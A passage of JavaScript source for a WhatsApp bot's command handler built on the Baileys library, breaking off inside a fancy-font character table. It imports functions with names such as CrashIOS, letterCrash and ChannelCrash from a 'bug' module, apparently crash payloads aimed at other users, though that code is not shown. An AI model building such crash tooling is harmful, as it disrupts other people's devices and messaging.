require('./system/config');
const { default: baileys, proto, getContentType, generateWAMessage, generateWAMessageFromContent, generateWAMessageContent, prepareWAMessageMedia,  downloadContentFromMessage } = require("@whiskeysockets/baileys");
const { default: makeWaSocket } = require('@whiskeysockets/baileys');
const fs = require('fs');
const mime = require('mime-types');
const NodeCache = require('node-cache');
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const pino = require('pino')
const { performance } = require('perf_hooks');
const { writeFile, unlink } = require('fs/promises');
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const JavaScriptObfuscator = require('javascript-obfuscator');
const path = require('path');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const cheerio = require('cheerio');
const { promisify } = require('util');
const gis = promisify(require('g-i-s'));
const { getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, fetchJson, reSize, sleep, isUrl, runtime } = require('./system/myLib/FuncIndex');

const { protocolbug1, protocolbug2, protocolbug3, protocolbug5, protocolbug6, protocolbug7, protocolbug8, bulldozer, invisxaudio, invisxlocation, NewStellarStuck, CrashIOS, invico2, letterCrash, StickerPack6, StallerPackFreze, ChannelCrash1, ChannelCrash2, ChannelCrash3, XMLUI } = require('./bug')


module.exports = async function zynHandler(ask, m, msg, store) { 
 try{
 
   const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
//================FIN===================\\\
//DEV ASK TECH BASE ENC
//==============DATABASE================//
   global.spamDB = {};
const premium = JSON.parse(fs.readFileSync("./system/database/premium.json"))
const owner2 = JSON.parse(fs.readFileSync("./system/database/owner.json"))
const isPremium = premium.includes(m.sender)
const isAsk = ['24174265527']
//================FIN===================\\\
// DEV ASK TECH BASE ENC 
//===============CONFIGURASI============//
const autoreactConfig = JSON.parse(fs.readFileSync('./system/database/autoreact.json'));
if (autoreactConfig.status) {
    const randomEmoji = autoreactConfig.emojis[Math.floor(Math.random() * autoreactConfig.emojis.length)];
    await ask.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
const sender = m.key.fromMe ? ask.user.id.split(":")[0] + "@s.whatsapp.net" || ask.user.id : m.key.participant || m.key.remoteJid;
const budy = (typeof m.text === 'string' ? m.text : '');
const prefix = ".";
if (!body.startsWith(prefix)) return;  
const isCreator = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
const moment = require('moment-timezone');
const time = moment().format("HH:mm:ss DD/MM");
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = args.join(" ")
const botNumber = await ask.decodeJid(ask.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || "No Name"
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ask.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participants?.admin !== null ? true : false

const CHANNEL_FILE = './system/database/channels.json';
function loadChannels() {
  try {
    const data = fs.readFileSync(CHANNEL_FILE);
    return JSON.parse(data).authorizedChannels;
  } catch {
    return [];
  }
}

function saveChannels(channels) {
  fs.writeFileSync(CHANNEL_FILE, JSON.stringify({ authorizedChannels: channels }, null, 2));
}
let authorizedChannels = loadChannels();   
const MASTER_OWNERS = ['24174165527@s.whatsapp.net'];


console.log(chalk.blue('╭─────────────────────────────❀'));
        console.log(chalk.blue('𝔸𝕊𝕂 𝐗𝐌𝐃 !'));
        console.log(chalk.blue('├─────────────────────────────'));
        console.log(chalk.blue(`│ 📅 Date : `) + chalk.cyan(new Date().toLocaleString()));
        console.log(chalk.blue(`│ 💬 Message : `) + chalk.white(m.body || m.mtype));
        console.log(chalk.blue(`│ 👤 Expéditeur : `) + chalk.magenta(m.pushName));
        console.log(chalk.blue(`│ 📱 Numéro : `) + chalk.red(senderNumber));
        if (m.isGroup) {
            console.log(chalk.blue('├─────────────────────────────'));
            console.log(chalk.blue(`│ 👥 Groupe : `) + chalk.green(groupName));
            console.log(chalk.blue(`│ Gp participant : `) + chalk.red(participants.length));
            console.log(chalk.blue(`│ 🆔 ID du groupe : `) + chalk.red(m.chat));
        }
        console.log(chalk.blue('╰─────────────────────────────❀\n'));
const now = new Date();
        const options = { timeZone: 'Africa/Libreville', hour12: false };
        const day = now.toLocaleDateString('fr-FR', { weekday: 'long', timeZone: 'Africa/Libreville' });
        const date = now.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric', timeZone: 'Africa/Libreville' });
// Exemple de fonction pour obtenir l'ID utilisateur à partir d'un numéro
async function getUserIdFromNumber(target) {
    // Vérifiez si le numéro est valide et est sur WhatsApp
    const user = await ask.onWhatsApp(`${target}@s.whatsapp.net`);
    if (user.length > 0) {
        return user[0].jid; // Retournez l'identifiant utilisateur
    } else {
        return null; // Retournez null si l'utilisateur n'est pas trouvé
    }
}        
if (!ask.public) {
if (!m.key.fromMe) return;
        }
const blockedNums = ["24165373838", "24174265527"];

 
const fancy = {    
    0:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ค","b":"๖","c":"¢","d":"໓","e":"ē","f":"f","g":"ງ","h":"h","i":"i","j":"ว","k":"k","l":"l","m":"๓","n":"ຖ","o":"໐","p":"p","q":"๑","r":"r","s":"Ş","t":"t","u":"น","v":"ง","w":"ຟ","x":"x","y":"ฯ","z":"ຊ","A":"ค","B":"๖","C":"¢","D":"໓","E":"ē","F":"f","G":"ງ","H":"h","I":"i","J":"ว","K":"k","L":"l","M":"๓","N":"ຖ","O":"໐","P":"p","Q":"๑","R":"r","S":"Ş","T":"t","U":"น","V":"ง","W":"ຟ","X":"x","Y":"ฯ","Z":"ຊ" },
    1:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ą","b":"ც","c":"ƈ","d":"ɖ","e":"ɛ","f":"ʄ","g":"ɠ","h":"ɧ","i":"ı","j":"ʝ","k":"ƙ","l":"Ɩ","m":"ɱ","n":"ŋ","o":"ơ","p":"℘","q":"զ","r":"ཞ","s":"ʂ","t":"ɬ","u":"ų","v":"۷","w":"ῳ","x":"ҳ","y":"ყ","z":"ʑ","A":"ą","B":"ც","C":"ƈ","D":"ɖ","E":"ɛ","F":"ʄ","G":"ɠ","H":"ɧ","I":"ı","J":"ʝ","K":"ƙ","L":"Ɩ","M":"ɱ","N":"ŋ","O":"ơ","P":"℘","Q":"զ","R":"ཞ","S":"ʂ","T":"ɬ","U":"ų","V":"۷","W":"ῳ","X":"ҳ","Y":"ყ","Z":"ʑ" },
    2:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ﾑ","b":"乃","c":"ᄃ","d":"り","e":"乇","f":"ｷ","g":"ム","h":"ん","i":"ﾉ","j":"ﾌ","k":"ズ","l":"ﾚ","m":"ﾶ","n":"刀","o":"の","p":"ｱ","q":"ゐ","r":"尺","s":"丂","t":"ｲ","u":"ひ","v":"√","w":"W","x":"ﾒ","y":"ﾘ","z":"乙","A":"ﾑ","B":"乃","C":"ᄃ","D":"り","E":"乇","F":"ｷ","G":"ム","H":"ん","I":"ﾉ","J":"ﾌ","K":"ズ","L":"ﾚ","M":"ﾶ","N":"刀","O":"の","P":"ｱ","Q":"ゐ","R":"尺","S":"丂","T":"ｲ","U":"ひ","V":"√","W":"W","X":"ﾒ","Y":"ﾘ","Z":"乙" },
    3:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"卂","b":"乃","c":"匚","d":"ᗪ","e":"乇","f":"千","g":"Ꮆ","h":"卄","i":"丨","j":"ﾌ","k":"Ҝ","l":"ㄥ","m":"爪","n":"几","o":"ㄖ","p":"卩","q":"Ɋ","r":"尺","s":"丂","t":"ㄒ","u":"ㄩ","v":"ᐯ","w":"山","x":"乂","y":"ㄚ","z":"乙","A":"卂","B":"乃","C":"匚","D":"ᗪ","E":"乇","F":"千","G":"Ꮆ","H":"卄","I":"丨","J":"ﾌ","K":"Ҝ","L":"ㄥ","M":"爪","N":"几","O":"ㄖ","P":"卩","Q":"Ɋ","R":"尺","S":"丂","T":"ㄒ","U":"ㄩ","V":"ᐯ","W":"山","X":"乂","Y":"ㄚ","Z":"乙" },
    4:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"🄰","b":"🄱","c":"🄲","d":"🄳","e":"🄴","f":"🄵","g":"🄶","h":"🄷","i":"🄸","j":"🄹","k":"🄺","l":"🄻","m":"🄼","n":"🄽","o":"🄾","p":"🄿","q":"🅀","r":"🅁","s":"🅂","t":"🅃","u":"🅄","v":"🅅","w":"🅆","x":"🅇","y":"🅈","z":"🅉","A":"🄰","B":"🄱","C":"🄲","D":"🄳","E":"🄴","F":"🄵","G":"🄶","H":"🄷","I":"🄸","J":"🄹","K":"🄺","L":"🄻","M":"🄼","N":"🄽","O":"🄾","P":"🄿","Q":"🅀","R":"🅁","S":"🅂","T":"🅃","U":"🅄","V":"🅅","W":"🅆","X":"🅇","Y":"🅈","Z":"🅉" },
    5:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"Ꮧ","b":"Ᏸ","c":"ፈ","d":"Ꮄ","e":"Ꮛ","f":"Ꭶ","g":"Ꮆ","h":"Ꮒ","i":"Ꭵ","j":"Ꮰ","k":"Ꮶ","l":"Ꮭ","m":"Ꮇ","n":"Ꮑ","o":"Ꭷ","p":"Ꭾ","q":"Ꭴ","r":"Ꮢ","s":"Ꮥ","t":"Ꮦ","u":"Ꮼ","v":"Ꮙ","w":"Ꮗ","x":"ጀ","y":"Ꭹ","z":"ፚ","A":"Ꮧ","B":"Ᏸ","C":"ፈ","D":"Ꮄ","E":"Ꮛ","F":"Ꭶ","G":"Ꮆ","H":"Ꮒ","I":"Ꭵ","J":"Ꮰ","K":"Ꮶ","L":"Ꮭ","M":"Ꮇ","N":"Ꮑ","O":"Ꭷ","P":"Ꭾ","Q":"Ꭴ","R":"Ꮢ","S":"Ꮥ","T":"Ꮦ","U":"Ꮼ","V":"Ꮙ","W":"Ꮗ","X":"ጀ","Y":"Ꭹ","Z":"ፚ" },
    6:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ᗩ","b":"ᗷ","c":"ᑕ","d":"ᗪ","e":"E","f":"ᖴ","g":"G","h":"ᕼ","i":"I","j":"ᒍ","k":"K","l":"ᒪ","m":"ᗰ","n":"ᑎ","o":"O","p":"ᑭ","q":"ᑫ","r":"ᖇ","s":"ᔕ","t":"T","u":"ᑌ","v":"ᐯ","w":"ᗯ","x":"᙭","y":"Y","z":"ᘔ","A":"ᗩ","B":"ᗷ","C":"ᑕ","D":"ᗪ","E":"E","F":"ᖴ","G":"G","H":"ᕼ","I":"I","J":"ᒍ","K":"K","L":"ᒪ","M":"ᗰ","N":"ᑎ","O":"O","P":"ᑭ","Q":"ᑫ","R":"ᖇ","S":"ᔕ","T":"T","U":"ᑌ","V":"ᐯ","W":"ᗯ","X":"᙭","Y":"Y","Z":"ᘔ" },
    7:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ǟ","b":"ɮ","c":"ƈ","d":"ɖ","e":"ɛ","f":"ʄ","g":"ɢ","h":"ɦ","i":"ɨ","j":"ʝ","k":"ӄ","l":"ʟ","m":"ʍ","n":"ռ","o":"օ","p":"ք","q":"զ","r":"ʀ","s":"ֆ","t":"ȶ","u":"ʊ","v":"ʋ","w":"ա","x":"Ӽ","y":"ʏ","z":"ʐ","A":"ǟ","B":"ɮ","C":"ƈ","D":"ɖ","E":"ɛ","F":"ʄ","G":"ɢ","H":"ɦ","I":"ɨ","J":"ʝ","K":"ӄ","L":"ʟ","M":"ʍ","N":"ռ","O":"օ","P":"ք","Q":"զ","R":"ʀ","S":"ֆ","T":"ȶ","U":"ʊ","V":"ʋ","W":"ա","X":"Ӽ","Y":"ʏ","Z":"ʐ" },
    8:{"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿","a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣","A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉" },
    9:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝙖","b":"𝙗","c":"𝙘","d":"𝙙","e":"𝙚","f":"𝙛","g":"𝙜","h":"𝙝","i":"𝙞","j":"𝙟","k":"𝙠","l":"𝙡","m":"𝙢","n":"𝙣","o":"𝙤","p":"𝙥","q":"𝙦","r":"𝙧","s":"𝙨","t":"𝙩","u":"𝙪","v":"𝙫","w":"𝙬","x":"𝙭","y":"𝙮","z":"𝙯","A":"𝘼","B":"𝘽","C":"𝘾","D":"𝘿","E":"𝙀","F":"𝙁","G":"𝙂","H":"𝙃","I":"𝙄","J":"𝙅","K":"𝙆","L":"𝙇","M":"𝙈","N":"𝙉","O":"𝙊","P":"𝙋","Q":"𝙌","R":"𝙍","S":"𝙎","T":"𝙏","U":"𝙐","V":"𝙑","W":"𝙒","X":"𝙓","Y":"𝙔","Z":"𝙕" },
    10:{"0":"𝟎","1":"𝟏","2":"𝟐","3":"𝟑","4":"𝟒","5":"𝟓","6":"𝟔","7":"𝟕","8":"𝟖","9":"𝟗","a":"𝐚","b":"𝐛","c":"𝐜","d":"𝐝","e":"𝐞","f":"𝐟","g":"𝐠","h":"𝐡","i":"𝐢","j":"𝐣","k":"𝐤","l":"𝐥","m":"𝐦","n":"𝐧","o":"𝐨","p":"𝐩","q":"𝐪","r":"𝐫","s":"𝐬","t":"𝐭","u":"𝐮","v":"𝐯","w":"𝐰","x":"𝐱","y":"𝐲","z":"𝐳","A":"𝐀","B":"𝐁","C":"𝐂","D":"𝐃","E":"𝐄","F":"𝐅","G":"𝐆","H":"𝐇","I":"𝐈","J":"𝐉","K":"𝐊","L":"𝐋","M":"𝐌","N":"𝐍","O":"𝐎","P":"𝐏","Q":"𝐐","R":"𝐑","S":"𝐒","T":"𝐓","U":"𝐔","V":"𝐕","W":"𝐖","X":"𝐗","Y":"𝐘","Z":"𝐙" },
    11:{"0":"𝟬","1":"𝟭","2":"𝟮","3":"𝟯","4":"𝟰","5":"𝟱","6":"𝟲","7":"𝟳","8":"𝟴","9":"𝟵","a":"𝗮","b":"𝗯","c":"𝗰","d":"𝗱","e":"𝗲","f":"𝗳","g":"𝗴","h":"𝗵","i":"𝗶","j":"𝗷","k":"𝗸","l":"𝗹","m":"𝗺","n":"𝗻","o":"𝗼","p":"𝗽","q":"𝗾","r":"𝗿","s":"𝘀","t":"𝘁","u":"𝘂","v":"𝘃","w":"𝘄","x":"𝘅","y":"𝘆","z":"𝘇","A":"𝗔","B":"𝗕","C":"𝗖","D":"𝗗","E":"𝗘","F":"𝗙","G":"𝗚","H":"𝗛","I":"𝗜","J":"𝗝","K":"𝗞","L":"𝗟","M":"𝗠","N":"𝗡","O":"𝗢","P":"𝗣","Q":"𝗤","R":"𝗥","S":"𝗦","T":"𝗧","U":"𝗨","V":"𝗩","W":"𝗪","X":"𝗫","Y":"𝗬","Z":"𝗭" },
    12: {"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝘢","b":"𝘣","c":"𝘤","d":"𝘥","e":"𝘦","f":"𝘧","g":"𝘨","h":"𝘩","i":"𝘪","j":"𝘫","k":"𝘬","l":"𝘭","m":"𝘮","n":"𝘯","o":"𝘰","p":"𝘱","q":"𝘲","r":"𝘳","s":"𝘴","t":"𝘵","u":"𝘶","v":"𝘷","w":"𝘸","x":"𝘹","y":"𝘺","z":"𝘻","A":"𝘈","B":"𝘉","C":"𝘊","D":"𝘋","E":"𝘌","F":"𝘍","G":"𝘎","H":"𝘏","I":"𝘐","J":"𝘑","K":"𝘒","L":"𝘓","M":"𝘔","N":"𝘕","O":"𝘖","P":"𝘗","Q":"𝘘","R":"𝘙","S":"𝘚","T":"𝘛","U":"𝘜","V":"𝘝","W":"𝘞","X":"𝘟","Y":"𝘠","Z":"𝘡" },
    13:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"α","b":"Ⴆ","c":"ƈ","d":"ԃ","e":"ҽ","f":"ϝ","g":"ɠ","h":"ԋ","i":"ι","j":"ʝ","k":"ƙ","l":"ʅ","m":"ɱ","n":"ɳ","o":"σ","p":"ρ","q":"ϙ","r":"ɾ","s":"ʂ","t":"ƚ","u":"υ","v":"ʋ","w":"ɯ","x":"x","y":"ყ","z":"ȥ","A":"A","B":"B","C":"C","D":"D","E":"E","F":"F","G":"G","H":"H","I":"I","J":"J","K":"K","L":"L","M":"M","N":"N","O":"O","P":"P","Q":"Q","R":"R","S":"S","T":"T","U":"U","V":"V","W":"W","X":"X","Y":"Y","Z":"Z" },
    14:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"₳","b":"฿","c":"₵","d":"Đ","e":"Ɇ","f":"₣","g":"₲","h":"Ⱨ","i":"ł","j":"J","k":"₭","l":"Ⱡ","m":"₥","n":"₦","o":"Ø","p":"₱","q":"Q","r":"Ɽ","s":"₴","t":"₮","u":"Ʉ","v":"V","w":"₩","x":"Ӿ","y":"Ɏ","z":"Ⱬ","A":"₳","B":"฿","C":"₵","D":"Đ","E":"Ɇ","F":"₣","G":"₲","H":"Ⱨ","I":"ł","J":"J","K":"₭","L":"Ⱡ","M":"₥","N":"₦","O":"Ø","P":"₱","Q":"Q","R":"Ɽ","S":"₴","T":"₮","U":"Ʉ","V":"V","W":"₩","X":"Ӿ","Y":"Ɏ","Z":"Ⱬ" },
    15:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"å","b":"ß","c":"¢","d":"Ð","e":"ê","f":"£","g":"g","h":"h","i":"ï","j":"j","k":"k","l":"l","m":"m","n":"ñ","o":"ð","p":"þ","q":"q","r":"r","s":"§","t":"†","u":"µ","v":"v","w":"w","x":"x","y":"¥","z":"z","A":"Ä","B":"ß","C":"Ç","D":"Ð","E":"È","F":"£","G":"G","H":"H","I":"Ì","J":"J","K":"K","L":"L","M":"M","N":"ñ","O":"Ö","P":"þ","Q":"Q","R":"R","S":"§","T":"†","U":"Ú","V":"V","W":"W","X":"×","Y":"¥","Z":"Z" },
    16:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"α","b":"в","c":"¢","d":"∂","e":"є","f":"ƒ","g":"g","h":"н","i":"ι","j":"נ","k":"к","l":"ℓ","m":"м","n":"η","o":"σ","p":"ρ","q":"q","r":"я","s":"ѕ","t":"т","u":"υ","v":"ν","w":"ω","x":"χ","y":"у","z":"z","A":"α","B":"в","C":"¢","D":"∂","E":"є","F":"ƒ","G":"g","H":"н","I":"ι","J":"נ","K":"к","L":"ℓ","M":"м","N":"η","O":"σ","P":"ρ","Q":"q","R":"я","S":"ѕ","T":"т","U":"υ","V":"ν","W":"ω","X":"χ","Y":"у","Z":"z" },
    17:{"0":"⊘","1":"𝟙","2":"ϩ","3":"Ӡ","4":"५","5":"Ƽ","6":"Ϭ","7":"7","8":"𝟠","9":"९","a":"ą","b":"ҍ","c":"ç","d":"ժ","e":"ҽ","f":"ƒ","g":"ց","h":"հ","i":"ì","j":"ʝ","k":"ҟ","l":"Ӏ","m":"ʍ","n":"ղ","o":"օ","p":"ք","q":"զ","r":"ɾ","s":"ʂ","t":"է","u":"մ","v":"ѵ","w":"ա","x":"×","y":"վ","z":"Հ","A":"Ⱥ","B":"β","C":"↻","D":"Ꭰ","E":"Ɛ","F":"Ƒ","G":"Ɠ","H":"Ƕ","I":"į","J":"ل","K":"Ҡ","L":"Ꝉ","M":"Ɱ","N":"ហ","O":"ට","P":"φ","Q":"Ҩ","R":"འ","S":"Ϛ","T":"Ͳ","U":"Ա","V":"Ỽ","W":"చ","X":"ჯ","Y":"Ӌ","Z":"ɀ" },
    18:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"Λ","b":"B","c":"ᄃ","d":"D","e":"Σ","f":"F","g":"G","h":"Ή","i":"I","j":"J","k":"K","l":"ᄂ","m":"M","n":"П","o":"Ө","p":"P","q":"Q","r":"Я","s":"Ƨ","t":"Ƭ","u":"Ц","v":"V","w":"Щ","x":"X","y":"Y","z":"Z","A":"Λ","B":"B","C":"ᄃ","D":"D","E":"Σ","F":"F","G":"G","H":"Ή","I":"I","J":"J","K":"K","L":"ᄂ","M":"M","N":"П","O":"Ө","P":"P","Q":"Q","R":"Я","S":"Ƨ","T":"Ƭ","U":"Ц","V":"V","W":"Щ","X":"X","Y":"Y","Z":"Z" },
    19:{"0":"₀","1":"₁","2":"₂","3":"₃","4":"₄","5":"₅","6":"₆","7":"₇","8":"₈","9":"₉","a":"ₐ","b":"b","c":"c","d":"d","e":"ₑ","f":"f","g":"g","h":"ₕ","i":"ᵢ","j":"ⱼ","k":"ₖ","l":"ₗ","m":"ₘ","n":"ₙ","o":"ₒ","p":"ₚ","q":"q","r":"ᵣ","s":"ₛ","t":"ₜ","u":"ᵤ","v":"ᵥ","w":"w","x":"ₓ","y":"y","z":"z","A":"ₐ","B":"B","C":"C","D":"D","E":"ₑ","F":"F","G":"G","H":"ₕ","I":"ᵢ","J":"ⱼ","K":"ₖ","L":"ₗ","M":"ₘ","N":"ₙ","O":"ₒ","P":"ₚ","Q":"Q","R":"ᵣ","S":"ₛ","T":"ₜ","U":"ᵤ","V":"ᵥ","W":"W","X":"ₓ","Y":"Y","Z":"Z","+":"₊","-":"₋",":":"₌","(":"₍",")":"₎" },
    20:{"0":"⁰","1":"¹","2":"²","3":"³","4":"⁴","5":"⁵","6":"⁶","7":"⁷","8":"⁸","9":"⁹","a":"ᵃ","b":"ᵇ","c":"ᶜ","d":"ᵈ","e":"ᵉ","f":"ᶠ","g":"ᵍ","h":"ʰ","i":"ⁱ","j":"ʲ","k":"ᵏ","l":"ˡ","m":"ᵐ","n":"ⁿ","o":"ᵒ","p":"ᵖ","q":"q","r":"ʳ","s":"ˢ","t":"ᵗ","u":"ᵘ","v":"ᵛ","w":"ʷ","x":"ˣ","y":"ʸ","z":"ᶻ","A":"ᴬ","B":"ᴮ","C":"ᶜ","D":"ᴰ","E":"ᴱ","F":"ᶠ","G":"ᴳ","H":"ᴴ","I":"ᴵ","J":"ᴶ","K":"ᴷ","L":"ᴸ","M":"ᴹ","N":"ᴺ","O":"ᴼ","P":"ᴾ","Q":"Q","R":"ᴿ","S":"ˢ","T":"ᵀ","U":"ᵁ","V":"ⱽ","W":"ᵂ","X":"ˣ","Y":"ʸ","Z":"ᶻ","+":"⁺","-":"⁻",":":"⁼","(":"⁽",")":"⁾" },
    21:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ค","b":"๒","c":"ς","d":"๔","e":"є","f":"Ŧ","g":"ﻮ","h":"ђ","i":"เ","j":"ן","k":"к","l":"ɭ","m":"๓","n":"ภ","o":"๏","p":"ק","q":"ợ","r":"г","s":"ร","t":"Շ","u":"ย","v":"ש","w":"ฬ","x":"א","y":"ץ","z":"չ","A":"ค","B":"๒","C":"ς","D":"๔","E":"є","F":"Ŧ","G":"ﻮ","H":"ђ","I":"เ","J":"ן","K":"к","L":"ɭ","M":"๓","N":"ภ","O":"๏","P":"ק","Q":"ợ","R":"г","S":"ร","T":"Շ","U":"ย","V":"ש","W":"ฬ","X":"א","Y":"ץ","Z":"չ" },
    22:{"0":"𝟘","1":"𝟙","2":"𝟚","3":"𝟛","4":"𝟜","5":"𝟝","6":"𝟞","7":"𝟟","8":"𝟠","9":"𝟡","a":"𝕒","b":"𝕓","c":"𝕔","d":"𝕕","e":"𝕖","f":"𝕗","g":"𝕘","h":"𝕙","i":"𝕚","j":"𝕛","k":"𝕜","l":"𝕝","m":"𝕞","n":"𝕟","o":"𝕠","p":"𝕡","q":"𝕢","r":"𝕣","s":"𝕤","t":"𝕥","u":"𝕦","v":"𝕧","w":"𝕨","x":"𝕩","y":"𝕪","z":"𝕫","A":"𝔸","B":"𝔹","C":"ℂ","D":"𝔻","E":"𝔼","F":"𝔽","G":"𝔾","H":"ℍ","I":"𝕀","J":"𝕁","K":"𝕂","L":"𝕃","M":"𝕄","N":"ℕ","O":"𝕆","P":"ℙ","Q":"ℚ","R":"ℝ","S":"𝕊","T":"𝕋","U":"𝕌","V":"𝕍","W":"𝕎","X":"𝕏","Y":"𝕐","Z":"ℤ" },
    23:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝖆","b":"𝖇","c":"𝖈","d":"𝖉","e":"𝖊","f":"𝖋","g":"𝖌","h":"𝖍","i":"𝖎","j":"𝖏","k":"𝖐","l":"𝖑","m":"𝖒","n":"𝖓","o":"𝖔","p":"𝖕","q":"𝖖","r":"𝖗","s":"𝖘","t":"𝖙","u":"𝖚","v":"𝖛","w":"𝖜","x":"𝖝","y":"𝖞","z":"𝖟","A":"𝕬","B":"𝕭","C":"𝕮","D":"𝕯","E":"𝕰","F":"𝕱","G":"𝕲","H":"𝕳","I":"𝕴","J":"𝕵","K":"𝕶","L":"𝕷","M":"𝕸","N":"𝕹","O":"𝕺","P":"𝕻","Q":"𝕼","R":"𝕽","S":"𝕾","T":"𝕿","U":"𝖀","V":"𝖁","W":"𝖂","X":"𝖃","Y":"𝖄","Z":"𝖅" },
    24:{q:"🆀",w:"🆆",e:"🅴",r:"🆁",t:"🆃",y:"🆈",u:"🆄",i:"🅸",o:"🅾",p:"🅿",a:"🅰",s:"🆂",d:"🅳",f:"🅵",g:"🅶",h:"🅷",j:"🅹",k:"🅺",l:"🅻",z:"🆉",x:"🆇",c:"🅲",v:"🆅",b:"🅱",n:"🅽",m:"🅼"}, 
    25:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝓪","b":"𝓫","c":"𝓬","d":"𝓭","e":"𝓮","f":"𝓯","g":"𝓰","h":"𝓱","i":"𝓲","j":"𝓳","k":"𝓴","l":"𝓵","m":"𝓶","n":"𝓷","o":"𝓸","p":"𝓹","q":"𝓺","r":"𝓻","s":"𝓼","t":"𝓽","u":"𝓾","v":"𝓿","w":"𝔀","x":"𝔁","y":"𝔂","z":"𝔃","A":"𝓐","B":"𝓑","C":"𝓒","D":"𝓓","E":"𝓔","F":"𝓕","G":"𝓖","H":"𝓗","I":"𝓘","J":"𝓙","K":"𝓚","L":"𝓛","M":"𝓜","N":"𝓝","O":"𝓞","P":"𝓟","Q":"𝓠","R":"𝓡","S":"𝓢","T":"𝓣","U":"𝓤","V":"𝓥","W":"𝓦","X":"𝓧","Y":"𝓨","Z":"𝓩" },
